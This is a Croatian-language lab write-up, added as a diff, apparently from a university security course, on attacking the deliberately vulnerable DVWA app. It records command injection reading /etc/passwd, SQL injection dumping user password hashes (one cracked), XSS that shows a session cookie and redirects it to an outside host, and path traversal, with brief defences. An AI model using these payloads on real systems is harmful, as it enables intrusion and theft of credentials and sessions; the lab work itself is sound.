@@ -1,0 +1,44 @@
+Command injection
+
+	1. Upis naredbe "1 | pwd", dobije se putanja trenutnog direktorija "/var/www/html/vulnerabilities/exec"
+	2. Upis naredbe "1 | ls", dobije se lista datoteka u trenutnom direktoriju "help index.php source"
+	3. Upis naredbe "1 | ls /", dobije se lista direktorija u "/"
+	4. Upis naredbe "1 | ls /etc", dobije se lista direktorija u "/etc"
+
+	5. Upis naredbe "1 | cat /etc/passwd", dobije se ispis prvih 20 redaka datoteke "/etc/passwd"
+	6. Upis naredbe "1 | sed -n 20,40p /etc/passwd", ne dobije se ni jedan novi redak datoteke "/etc/passwd" već samo redak 20., dakle ne može se dobiti više od prvih 20 redaka na ovaj način.
+
+	Jedina zapravo potreba naredba je 5. Sadržaj datoteke je priložen.
+
+
+SQL injection
+	1. Upis naredbe "bilo_sto' OR '1'='1", dobijemo nekoliko podataka u obliku "First name: Pablo Surname: Picasso".
+	2. Upis naredbe "1' ORDER BY x#", gdje je x prvo 1, onda 2 i na kraju 3 za koji se dobije greška, dakle uzima 2 parametra (što i znamo iz ispisa prethodne naredbe.)
+	3. Upis naredbe "' or 0=0 union select null, database();#", dobijemo među podacima podatak "First name: Surname: dvwa", dakle naziv baze podataka je "dvwa".
+
+	4. Upis naredbe "' or 0=1 union select first_name, password from users;#", dobijemo podatke u obliku "First name: Pablo Surname: 0d107d09f5bbe40cade3de5c71e9e9b7", dakle umjesto prezimena piše funkcija sažetka lozinke.
+	
+	Saznali smo da je MD5 hash lozinke Pabla Picassa "0d107d09f5bbe40cade3de5c71e9e9b7", web stranicom https://crackstation.net/ smo probili oktrili da je lozinka "letmein"
+
+XSS 
+	1. Upis naredbe "", prilikom svakog osvježavanja stranice se pokaže obavijest s tijelom poruke "test".
+	2. Upis naredbe "", prilikom svakog osvježavanja stranice pokaže obavijest s tijelom poruke "PHPSESSID=h84vaa07p7f87quevv0ojtk3b3; security=low"
+	
+PHPSESSID=h84vaa07p7f87quevv0ojtk3b3
+
+	3. Potrebno je promijeniti ograničenje teksta u polju za unos, to se može koristeći "Inspect element."
+	4. Upis naredbe "", preusmjereni smo na "http://public.tel.fer.hr/sui/?%20test=PHPSESSID=h84vaa07p7f87quevv0ojtk3b3;%20security=low"
+
+	Radi zaštite može se:
+		- filtrirati poruke koje sadrže tokene poput "<script>"
+		- kodirati sav korisnikov unos kako bi se izbjegla mogućnost interpretiranja kao nešto više od niza znakova
+		- napraviti da korisnik smije unositi samo znakove abecede, brojeve i točku (whitelisting)
+		- koristiti POST umjesto GET 
+		- koristiti samo HTTPOnly kolačiće
+
+File inclusion
+	
+	1. Moguće je umjesto datoteke u GET zahtjevu npr. "/vulnerabilities/fi/?page=file3.php", umjesto file3.php upisati proizvoljnu datoteku poput "../../../../../../etc/passwd", dakle unosom poveznice "ip/vulnerabilities/fi/?page=../../../../../../etc/passwd" dobit će se ispis datoteke s lozinkama.
+	
+	To je moguće jer nema nikakvog ograničenja za uključivanje datoteka za korisnike. Može se u potpunosti spriječiti tako da se odobre samo određene datoteke koje mogu biti uključene. 
+	
